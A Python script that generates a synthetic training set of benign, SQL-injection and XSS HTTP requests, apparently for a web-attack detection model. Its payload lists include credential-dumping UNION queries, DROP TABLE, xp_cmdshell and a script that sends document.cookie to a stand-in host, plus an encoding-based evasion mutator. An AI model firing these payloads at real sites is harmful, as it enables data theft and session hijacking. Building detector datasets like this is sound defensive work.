"""Builds a labelled synthetic dataset (benign / sqli / xss).

This is a BOOTSTRAP dataset so the pipeline runs end to end. For real use, add
public/real data (e.g. CSIC 2010, your own access logs) as extra rows in the same CSV schema:
    text,label,label_name
"""
import argparse
import random
import urllib.parse

import pandas as pd
from sklearn.model_selection import train_test_split

from .config import CFG
from .preprocess import request_to_text

WORDS = ["laptop", "shoes", "coffee", "book", "phone", "garden", "travel", "music", "python",
         "recipe", "winter jacket", "birthday gift", "running", "camera", "headphones"]
NAMES = ["alice", "bob", "o'brien", "d'souza", "maria", "li wei", "ravi", "john.doe", "sam_99"]
# Hard negatives: benign text that *looks* suspicious to naive keyword rules.
HARD_BENIGN = ["select a seat", "drop me a line", "union station tickets", "1=1 is true in math",
               "a < b and c > d", "script writing course", "alert me when in stock",
               "O'Reilly books", "update your profile", "delete my account please",
               "order by price", "5 > 3 && 2 < 4", "javascript tutorial for beginners"]
PATHS = ["/", "/products", "/products/42", "/search", "/api/v1/items", "/login", "/cart",
         "/profile", "/api/v1/users/7", "/blog/2024/new-features", "/static/app.js", "/contact"]
PARAMS = ["q", "id", "name", "user", "search", "category", "page", "comment", "email"]

SQLI = [
    "' OR '1'='1", "' OR 1=1 --", "admin'--", "1 UNION SELECT username, password FROM users",
    "1; DROP TABLE users", "' AND SLEEP(5)--", "') OR ('a'='a", "1 OR 1=1",
    "' UNION ALL SELECT NULL,NULL--", "1' ORDER BY 10--", "'; WAITFOR DELAY '0:0:5'--",
    "1 AND 1=CONVERT(int,@@version)", "' OR 'x'='x'#", "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0 --",
    "' HAVING 1=1 --", "1 UNION SELECT NULL, table_name FROM information_schema.tables",
    "'; EXEC xp_cmdshell('dir')--", "1' AND extractvalue(1,concat(0x7e,version()))--",
]
XSS = [
    "<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>",
    "javascript:alert(document.cookie)", "\"><script>alert(1)</script>",
    "<iframe src=javascript:alert(1)>", "<body onload=alert(1)>",
    "<a href=\"javascript:alert(1)\">click</a>", "'><img src=x onerror=prompt(1)>",
    "<input autofocus onfocus=alert(1)>", "<script>document.location='http://x.test/?c='+document.cookie</script>",
    "<details open ontoggle=alert(1)>", "<marquee onstart=alert(1)>", "<video><source onerror=alert(1)>",
]


def mutate(p: str, rng: random.Random) -> str:
    """Light evasion-style variations so the model learns robustness."""
    if rng.random() < 0.25:
        p = "".join(c.upper() if rng.random() < 0.5 else c.lower() for c in p)
    if rng.random() < 0.2:
        p = p.replace(" ", "/**/")
    e = rng.random()
    if e < 0.3:
        p = urllib.parse.quote(p)
    elif e < 0.4:
        p = urllib.parse.quote(urllib.parse.quote(p))
    return p


def _build(rng, value: str):
    """Place a value into a random request shape -> (method, path, query, body)."""
    path = rng.choice(PATHS)
    param = rng.choice(PARAMS)
    shape = rng.random()
    if shape < 0.5:
        return "GET", path, f"{param}={value}", ""
    if shape < 0.8:
        body = f"{rng.choice(['username','user','comment'])}={value}&{rng.choice(['password','token','page'])}={rng.randint(1,9999)}"
        return "POST", path, "", body
    if shape < 0.9:
        return "POST", path, "", '{"%s": "%s"}' % (param, value.replace('"', '\\"'))
    return "GET", f"{path}/{value}", "", ""


def benign(rng):
    r = rng.random()
    if r < 0.3:
        v = rng.choice(HARD_BENIGN)
    elif r < 0.6:
        v = rng.choice(WORDS)
    elif r < 0.8:
        v = rng.choice(NAMES)
    else:
        v = str(rng.randint(1, 100000))
    return _build(rng, urllib.parse.quote_plus(v) if rng.random() < 0.5 else v)


def attack(rng, bank):
    payload = mutate(rng.choice(bank), rng)
    prefix = rng.choice(["", "", str(rng.randint(1, 99)), rng.choice(WORDS)])
    return _build(rng, prefix + payload)


def make_rows(n: int, seed: int):
    rng = random.Random(seed)
    n_ben, n_sql = int(n * 0.5), int(n * 0.25)
    n_xss = n - n_ben - n_sql
    rows = []
    for _ in range(n_ben):
        rows.append((request_to_text(*benign(rng)), 0))
    for _ in range(n_sql):
        rows.append((request_to_text(*attack(rng, SQLI)), 1))
    for _ in range(n_xss):
        rows.append((request_to_text(*attack(rng, XSS)), 2))
    df = pd.DataFrame(rows, columns=["text", "label"]).drop_duplicates("text")
    df["label_name"] = df["label"].map(CFG.id2label)
    return df.sample(frac=1, random_state=seed).reset_index(drop=True)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--n", type=int, default=12000)
    ap.add_argument("--seed", type=int, default=CFG.seed)
    a = ap.parse_args()

    df = make_rows(a.n, a.seed)
    train, tmp = train_test_split(df, test_size=0.3, stratify=df["label"], random_state=a.seed)
    val, test = train_test_split(tmp, test_size=0.5, stratify=tmp["label"], random_state=a.seed)
    CFG.data_dir.mkdir(parents=True, exist_ok=True)
    for name, part in [("train", train), ("val", val), ("test", test)]:
        part.to_csv(CFG.data_dir / f"{name}.csv", index=False)
    print(f"Wrote train={len(train)} val={len(val)} test={len(test)} to {CFG.data_dir}")
    print(df["label_name"].value_counts().to_string())


if __name__ == "__main__":
    main()
